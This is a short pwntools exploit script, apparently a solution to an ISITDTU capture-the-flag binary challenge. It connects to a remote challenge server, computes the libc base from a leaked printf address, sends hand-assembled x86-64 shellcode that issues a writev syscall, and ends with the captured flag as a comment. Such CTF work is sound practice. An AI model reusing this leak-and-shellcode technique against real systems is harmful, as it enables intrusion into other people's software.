#!/usr/bin/env python3

from pwn import *

exe = ELF("./challenge_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.update(os = "linux", arch = "amd64", log_level = "debug", terminal = "cmd.exe /c start wsl".split(), binary = exe)

# p = process(exe.path)
p = remote("152.69.210.130", 3001)

sl  = p.sendline
sa  = p.sendafter
sla = p.sendlineafter
rl  = p.recvline
ru  = p.recvuntil

ru(b"Some gift for you: ")

libc_leak = int(rl().strip(), 16) 
libc_base = libc_leak - libc.symbols["printf"]
log.info(f"libc leak = {hex(libc_leak)}")

payload = asm("""
    add rdx, 0x1000      
    mov rax, 0x100
    push rax         
    push rdx          
    mov rdi, 1 
    mov rsi, rsp 
    mov rdx, 1                                 
    mov rax, 0x14
    syscall           
""")

p.send(payload)

p.interactive() 
# ISITDTU{061e8c26e3cf9bfad4e22879994048c8257b17d8}